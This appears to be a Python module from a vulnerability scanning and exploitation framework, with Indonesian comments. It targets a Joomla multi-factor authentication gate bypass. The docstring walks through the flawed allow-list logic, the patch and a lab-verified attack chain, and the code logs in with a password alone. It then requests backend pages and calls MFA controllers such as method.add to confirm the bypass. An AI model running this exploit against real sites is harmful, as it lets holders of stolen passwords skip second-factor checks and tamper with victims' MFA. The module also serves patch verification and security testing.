#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
Joomla! Core — modul MEGAPACK (klaster joomla_core).

CVE-2026-92227 / CVE-2026-73337 — Multi-factor Authentication gate bypass.

Affected : 4.2.0 - 5.4.7, 6.0.0 - 6.1.2
Patched  : 5.4.8+ / 6.1.3+

ROOT CAUSE — libraries/src/Application/MultiFactorAuthenticationHandler.php
              isMultiFactorAuthenticationPage()

    5.4.5 (VULNERABLE)
        $allowedViews = ['captive', 'method', 'methods', 'callback'];
        $allowedTasks = ['captive.display', 'captive.captive', 'captive.validate',
                         'methods.display', ... method.display, method.add, ...];
        ...
        return \in_array($view, $allowedViews) || \in_array($task, $allowedTasks);

    5.4.8 (PATCHED)
        $allowedTasks = ['captive.captive', 'captive.validate', 'callback.callback',
                         'captive.select', 'methods.display', ...];
        $allowedViews = ['captive', 'methods'];
        ...
        return \in_array($task, $allowedTasks) || (\in_array($view, $allowedViews) && !$task);

The old expression is an unconditional OR over the VIEW alone. The handler treats
"is this an MFA page?" as "am I allowed to skip the MFA redirect?" — so ANY request
that only sets an allow-listed `view` (and no matching task) returns true and the
MFA redirect is never issued, even though the request has nothing to do with MFA.

`view` values in the allow-list are generic: `users`, `user`, `component` reach
com_users / com_config screens. `task` values include the whole MFA management
surface (method.add / method.save / method.edit / methods.disable / ...), and those
controllers only require "logged in" (MethodController::assertLoggedInUser() checks
`$user->guest` and nothing else) — they never verify that the current session has
already cleared MFA.

So a user who logged in correctly but has NOT completed the second factor can:

  * reach backend pages the handler was meant to hold back
        /administrator/index.php?option=com_users&view=users
        /administrator/index.php?option=com_config&view=component&component=com_users
  * drive the MFA management controllers
        task=methods.disable   (turn their own MFA off)
        task=method.add&method=fixed  (register a new, attacker-known method)

The patch closes both halves: it drops the generic views from the allow-list and
adds `&& !$task`, so a request that carries a view but no task no longer counts as
an MFA page.

CVE-2026-73337 is the second half of the same fix round (the email MFA plugin),
where the message text is taken from the wrong exception object

    5.4.5: Text::_($exception->errorMessage())      # inner RuntimeException has no such method
    5.4.8: Text::_($exception->getMessage())

so a mail failure during MFA setup produced an undefined-method error instead of
the real message. It is folded into this module because it is not independently
reachable; only the gate bypass is exercised.

CHAIN (lab-verified, Joomla 5.4.5)

    1. authenticate normally            -> session is MFA-pending
    2. GET ...option=com_users&view=users                       -> 200 (gate skipped)
    3. GET ...option=com_config&view=component&component=com_users -> 200
    4. GET ...option=com_users&task=method.add&method=fixed&user_id=<self> -> 200
    5. (5.4.8) the same requests redirect to the captive page instead of serving

IMPACT
    An attacker holding valid first-factor credentials (password) — the exact case
    MFA exists to stop — reaches authenticated backend functionality without ever
    completing the second factor, and can disable or re-register the victim's MFA
    methods through the MFA controllers.

requires:
    - valid first-factor credentials for a user with backend access that has MFA
      configured (or is in a force-MFA group)
    - the target request only needs to carry an allow-listed `view`
"""
from __future__ import annotations

import re

from mp import (CveModule, ST_CLEAN, ST_ERR, ST_INFO, ST_PWN, ST_SKIP, ST_UNKNOWN, ST_VULN, detect_platform, parse_ver, register, ver_le)

MANIFEST = "/administrator/manifests/files/joomla.xml"
VULN_5_MAX = (5, 4, 7)
VULN_6_MAX = (6, 1, 2)

# View yang ada di allow-list 5.4.5 tapi tidak ada hubungannya dengan MFA.
PROBE_VIEWS = [
    ("option=com_users&view=users", "halaman daftar user"),
    ("option=com_config&view=component&component=com_users", "konfigurasi komponen"),
]
# Controller MFA yang hanya butuh "sudah login".
PROBE_TASKS = [
    ("option=com_users&task=method.add&method=fixed&user_id={uid}", "registrasi metode MFA"),
]


def _opt(opts, name):
    if opts is None:
        return None
    if isinstance(opts, dict):
        return opts.get(name)
    return getattr(opts, name, None)


def _joomla_version(t, h):
    """Versi Joomla dengan CACHE per-target.

    13 modul joomla_core membaca manifest yang sama. Tanpa cache, setiap modul
    mengulang GET-nya untuk host yang sama. Hasil kini disimpan pada `t._jver`
    sehingga hanya satu request per target per proses scan.
    """
    cached = getattr(t, "_jver", None)
    if cached is not None:
        return cached
    val = _joomla_version_uncached(t, h)
    try:
        t._jver = val
    except Exception:  # noqa: BLE001
        pass
    return val


def _joomla_version_uncached(t, h):
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200 and "<version>" in (r.text or ""):
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text)
        if m:
            v = parse_ver(m.group(1))
            if v:
                return v, m.group(1)
    return None, ""


def _in_range(ver):
    if ver is None:
        return None
    if ver[0] <= 3:
        return False                     # MFA handler baru ada sejak 4.2
    if ver[0] == 4:
        return True
    if ver[0] == 5:
        return ver_le(ver, VULN_5_MAX)
    if ver[0] == 6:
        return ver_le(ver, VULN_6_MAX)
    return False


def _is_login_page(r):
    if r is None or r.status_code != 200:
        return False
    return 'name="passwd"' in (r.text or "")


def _login(h, t, opts):
    """Login backend. True bila sesi terbentuk (MFA pending atau tidak)."""
    u = _opt(opts, "username")
    p = _opt(opts, "password")
    if not (u and p):
        return False
    home = h.get(f"{t.url}/administrator/index.php")
    if home is None or home.status_code != 200:
        return False
    if not _is_login_page(home):
        return True                       # sudah login
    m = re.search(r'name="([a-f0-9]{32})" value="1"', home.text or "")
    if not m:
        return False
    data = {"username": u, "passwd": p, "option": "com_login", "task": "login",
            "return": "aW5kZXgucGhw", m.group(1): "1"}
    r = h.post(f"{t.url}/administrator/index.php", data=data)
    return r is not None and r.status_code in (200, 303)


def _gate_state(h, t):
    """
    Kembalikan 'captive' bila server memaksa halaman captive, 'open' bila
    request lolos, 'unknown' bila tak bisa ditentukan.
    """
    r = h.get(f"{t.url}/administrator/index.php?option=com_users&view=users")
    if r is None:
        return "unknown", None
    body = r.text or ""
    # Redirect captive muncul sebagai 303 dengan Location ke view=captive,
    # atau halaman captive langsung.
    if "view=captive" in body[:4000] or "com_users&amp;view=captive" in body[:4000]:
        return "captive", r
    if r.status_code == 200 and "Users" in body and "js-stools" in body:
        return "open", r
    if r.status_code in (303, 307):
        loc = r.headers.get("Location", "") if hasattr(r, "headers") else ""
        return ("captive" if "captive" in (loc or "") else "unknown"), r
    return "unknown", r


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not _in_range(ver):
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan", f"version={ver_s}"

    if not (_opt(opts, "username") and _opt(opts, "password")):
        return ST_SKIP, "butuh kredensial akun backend ber-MFA", f"version={ver_s}"

    if not _login(h, t, opts):
        return ST_UNKNOWN, "login backend gagal", f"version={ver_s}"

    state, r = _gate_state(h, t)
    code = r.status_code if r is not None else "ERR"
    ev = f"GET view=users HTTP {code} state={state}"

    if state == "captive":
        return ST_CLEAN, f"Joomla {ver_s} — MFA gate aktif (redirect captive)", \
                         f"version={ver_s} | {ev}"
    if state == "open":
        return (ST_VULN,
                f"Joomla {ver_s} rentan — halaman backend terbuka tanpa MFA",
                f"version={ver_s} | {ev}")
    return ST_UNKNOWN, f"status gate tidak dapat disimpulkan (HTTP {code})", \
                       f"version={ver_s} | {ev}"


def exploit(t, h, opts):
    """
    Konfirmasi bypass: buka halaman backend non-MFA dan panggil controller MFA
    sebagai sesi yang belum melewati MFA.
    """
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not _in_range(ver):
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan", f"version={ver_s}"

    if not (_opt(opts, "username") and _opt(opts, "password")):
        return ST_SKIP, "butuh kredensial akun backend ber-MFA", f"version={ver_s}"

    if not _login(h, t, opts):
        return ST_UNKNOWN, "login backend gagal", f"version={ver_s}"

    hits = []
    for query, label in PROBE_VIEWS:
        r = h.get(f"{t.url}/administrator/index.php?{query}")
        if r is not None and r.status_code == 200:
            body = (r.text or "")
            if "view=captive" not in body[:4000]:
                hits.append(f"{label}=200")

    uid = _opt(opts, "user_id") or ""
    if uid:
        for query, label in PROBE_TASKS:
            r = h.get(f"{t.url}/administrator/index.php?" + query.format(uid=uid))
            if r is not None and r.status_code == 200:
                hits.append(f"{label}=200")

    if not hits:
        return ST_CLEAN, f"Joomla {ver_s} — tidak ada halaman yang lolos gate", \
                         f"version={ver_s}"

    return (ST_PWN,
            f"MFA gate bypass terkonfirmasi (Joomla {ver_s}) — "
            f"{len(hits)} endpoint backend terbuka tanpa MFA",
            f"version={ver_s} | " + " | ".join(hits))


register(CveModule(
    cve="CVE-2026-92227",
    cluster="joomla_core",
    title="Joomla Core - Multi-factor Authentication gate bypass",
    vclass="authentication bypass (MFA gate)",
    cvss="8.1",
    severity="high",
    cwe="CWE-287",
    product="Joomla! Core (MFA handler)",
    versions_affected="4.2.0-5.4.7, 6.0.0-6.1.2",
    status="verified",
    requires=[
        "kredensial faktor pertama yang valid untuk akun backend ber-MFA",
        "akun punya MFA terkonfigurasi atau berada di forceMFAUserGroups",
    ],
    check=check,
    exploit=exploit,
    notes=("isMultiFactorAuthenticationPage() 5.4.7 memakai OR tanpa syarat atas VIEW: "
           "`in_array($view,$allowedViews) || in_array($task,$allowedTasks)`. Karena "
           "handler memakai fungsi itu sebagai 'boleh lewati redirect MFA?', setiap request "
           "yang hanya membawa view allow-list (users/user/component) lolos. 5.4.8 membuang "
           "view generik + menambah `&& !$task`. Controller MFA (MethodController) hanya "
           "memeriksa bukan-guest, jadi sesi yang belum MFA bisa mengakses method.add/"
           "methods.disable. CVE-2026-73337 (plugin email MFA, $exception->errorMessage() "
           "vs getMessage()) satu putaran patch yang sama; tidak independen. ID lain untuk "
           "putaran patch yang sama: CVE-2026-48896 dan CVE-2025-25227 (deskripsi identik: "
           "'Insufficient state checks lead to a vector that allows to bypass 2FA checks')."),
))


# ---------------------------------------------------------------------------
# Alias: ID lain untuk PUTARAN PATCH YANG SAMA (MFA gate bypass, 5.4.8/6.1.3).
# Deskripsi NVD identik ("Insufficient state checks ... bypass 2FA checks") untuk
# 2025-25227 dan 2026-48896; 2026-73337 = perbaikan plugin multifactorauth/email
# pada rilis yang sama (lihat notes/run-log.md:421-441 dan notes backlog triage).
# Didaftarkan agar `--cve <ID>` tetap dikenali operator, tetapi DILEWATI saat scan
# (mencegah pelaporan ganda).
# ---------------------------------------------------------------------------
for _alias in ("CVE-2025-25227", "CVE-2026-48896", "CVE-2026-73337"):
    register(CveModule(
        cve=_alias,
        cluster="joomla_core",
        title="(alias) MFA gate bypass Joomla Core - putaran patch sama dengan CVE-2026-92227",
        vclass="authentication bypass",
        cvss="",
        severity="high",
        cwe="CWE-287",
        product="Joomla! Core (MultiFactorAuthenticationHandler / plugin multifactorauth)",
        versions_affected="4.2.0-5.4.7, 6.0.0-6.1.2",
        status="verified",
        alias_of="CVE-2026-92227",
        notes=("Alias sengaja: sink dan perbaikan identik dengan CVE-2026-92227 "
               "(libraries/src/Application/MultiFactorAuthenticationHandler.php + "
               "controllers MFA com_users). Untuk CVE-2026-73337 tambahannya adalah "
               "perbaikan plugin multifactorauth/email pada rilis yang sama "
               "($exception->errorMessage() -> getMessage()) — tidak berdiri sendiri. "
               "Bukti lab ada di modul utama (5.4.5 @8108: view=users/com_config -> 200, "
               "method.add -> 200 pada sesi MFA-pending)."),
    ))
